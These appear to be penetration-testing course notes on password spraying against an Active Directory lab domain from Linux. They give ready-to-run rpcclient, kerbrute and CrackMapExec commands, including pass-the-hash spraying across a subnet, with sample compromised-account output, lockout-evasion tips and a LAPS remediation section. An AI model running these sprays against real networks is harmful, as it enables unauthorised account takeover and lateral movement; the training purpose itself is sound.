### 1️⃣1️⃣ Internal Password Spraying – From Linux

At this point you have:

* ✅ A **valid user list** (e.g., `valid_users.txt`)
* ✅ A **password policy** (min length, lockout threshold, timers)
* ✅ One or more **candidate passwords** (e.g., `Welcome1`, `Password123`, etc.)

Now you actually spray — very carefully.

---

## 🔹 Strategy Recap (Linux)

When spraying from Linux, your main options are:

* `rpcclient` → Simple, built-in to Samba, good for quick sprays
* `kerbrute` → Fast, Kerberos-based, lower noise in some logs
* `crackmapexec` → Tons of functionality, works for both domain & local accounts

Key OPSEC rule:

> **One password per “round,” across many users, then wait (per lockout policy).**
> Never cycle through multiple passwords per user in a row.

---

## 🔸 Rpcclient Bash One-Liner

`rpcclient` doesn’t clearly say “login succeeded”—instead you look for an **Authority Name** line to identify success.

Bash one-liner:

```bash
for u in $(cat valid_users.txt); do
  rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 \
    | grep Authority
done
```

Example output:

```text
Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

Each line like that = **valid username + password pair**.

Use-case:

* Very quick single-password spray when you already know the DC IP and candidate password.

---

## 🔸 Kerbrute Password Spray

Same target, but via Kerberos:

```bash
kerbrute passwordspray \
  -d inlanefreight.local \
  --dc 172.16.5.5 \
  valid_users.txt \
  Welcome1
```

Example:

```text
[+] VALID LOGIN:  sgage@inlanefreight.local:Welcome1
Done! Tested 57 logins (1 successes) in 0.172 seconds
```

Pros:

* Fast, clear output
* Uses Kerberos; different log footprint than SMB/rpcclient

OPSEC reminder:

* Even though Kerbrute’s *userenum* mode doesn’t cause logon failures, **passwordspray mode does**. You still have to respect lockout rules.

---

## 🔸 CrackMapExec Password Spray (Domain)

CrackMapExec (CME) lets you spray one password across a whole user list and shows hits clearly.

Basic spray:

```bash
sudo crackmapexec smb 172.16.5.5 \
  -u valid_users.txt \
  -p Password123 \
  | grep '+'
```

Sample result:

```text
SMB  172.16.5.5  445  ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

That `+` line = **valid login**.

### Validating Individual Credentials with CME

Once you think you have a hit, validate explicitly:

```bash
sudo crackmapexec smb 172.16.5.5 \
  -u avazquez \
  -p Password123
```

Expected result:

```text
[+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

After that, you can pivot to:

* Enumeration (`--shares`, `--loggedon-users`, etc.)
* Other attacks (e.g., dumping info, lateral movement), depending on scope.

---

## 🔹 Local Administrator Password Reuse (Hash or Password)

Spraying isn’t just for **domain** accounts — it’s extremely effective for **local admin reuse**.

Scenario:

1. You compromise **one machine**, dump the local `administrator` NTLM hash or password.
2. You suspect the same local admin password is reused across many hosts.
3. You spray that hash/password across a subnet.

### Patterns to Watch

* Local admin password reused across:

  * Many desktops
  * All servers of a certain role (e.g., SQL, Exchange)
* “Patterned” passwords:

  * `Desktop` → `$desktop%@admin123`
  * `Server` → `$server%@admin123`
* Same password reused between:

  * `ajones` and `ajones_adm`
  * Accounts in different but trusted domains

### Spraying Local Admin Hashes with CME

If you only have an **NTLM hash** for `administrator`:

```bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 \
  -u administrator \
  -H 88ad09182de639ccc6579eb0849751cf \
  | grep '+'
```

Example hits:

```text
[+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
[+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
[+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

Notes:

* `--local-auth` = **critical** → tells CME to treat the username as local, not domain
* This avoids accidentally locking the *domain* Administrator account
* This technique is **noisy** and not appropriate for stealthy engagements

---

## 🔹 Reporting & Remediation Angle

When you successfully spray and find local admin reuse:

* Highlight the issue: **same local admin password across many hosts**
* Recommend Microsoft **LAPS** or equivalent:

  * Each machine gets a **unique**, AD-managed local admin password
  * Passwords rotate regularly
  * Stops “one box → entire subnet” compromises

---

